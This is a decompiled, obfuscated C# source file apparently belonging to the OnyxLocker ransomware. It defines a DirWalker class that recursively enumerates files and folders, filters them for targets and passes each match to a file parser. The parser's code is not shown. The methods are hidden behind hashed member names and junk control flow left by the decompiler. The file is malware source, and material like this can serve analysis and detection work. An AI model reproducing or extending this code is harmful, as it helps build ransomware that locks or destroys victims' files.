using System.IO;
using System.Threading;
using A;

namespace OnyxLocker;

internal class DirWalker
{
	private IFileChecker FileChecker { get; set; }

	private IFileParser FileParser { get; set; }

	public DirWalker(IFileChecker fileChecker, IFileParser fileParser)
	{
		c1ca734378b3de5ad16e6097987b8ed92.c757cc4db113ae43c821f8f25a1fa333e(this, fileChecker);
		cac18cba8303610e0d31a6d3fb71b324e.c757cc4db113ae43c821f8f25a1fa333e(this, fileParser);
	}

	public void TraverseDirectories(string startDirectory)
	{
		try
		{
			string[] files = Directory.GetFiles(startDirectory);
			for (int i = 0; i < (int)(nuint)cb00efdeef0091cd4922c68d40fb28e96.c8d798c339232c1b6b575ebd272b15269(files); i++)
			{
				c718596ade869b91de2de8e1ee9d6b9b1.c757cc4db113ae43c821f8f25a1fa333e(this, files[i].ToLower());
				Thread.Sleep(1);
			}
			while (true)
			{
				switch (5)
				{
				case 0:
					continue;
				}
				if (1 == 0)
				{
					/*OpCode not supported: LdMemberToken*/;
				}
				break;
			}
		}
		catch
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(startDirectory);
			for (int j = 0; j < (int)(nuint)cb00efdeef0091cd4922c68d40fb28e96.c8d798c339232c1b6b575ebd272b15269(directories); j++)
			{
				string cf12d116623214e322a450f3a2425f91f = directories[j];
				ce9d99999bd71c8910be3d89599fb0743.c757cc4db113ae43c821f8f25a1fa333e(this, cf12d116623214e322a450f3a2425f91f);
				Thread.Sleep(1);
			}
		}
		catch
		{
		}
	}

	private void ProcessFile(string filePath)
	{
		if (cecb65ab590cdf9a52bd2cbbf121c8bce.c757cc4db113ae43c821f8f25a1fa333e(this, filePath))
		{
			c1eebd54b4c1a6b26b42598fdfb26a741.cf4569e22c0f85ceb4658e58f206e1595(c75e44eb2ae28ae0fd829519a6068623d.c757cc4db113ae43c821f8f25a1fa333e(this), filePath);
		}
	}

	private bool IsTargetFile(string filePath)
	{
		if (!filePath.Contains(cffd0443b4551df482d235e66317d4cd4.ce57b55ca454aabe14bf635b4c85d996c(1)))
		{
			return c267b47b7c5cda6f3defbaa67fb544475.cf4569e22c0f85ceb4658e58f206e1595(c26d9c8588fbc86bed2b53297a46f80c6.c757cc4db113ae43c821f8f25a1fa333e(this), filePath);
		}
		return false;
	}
}
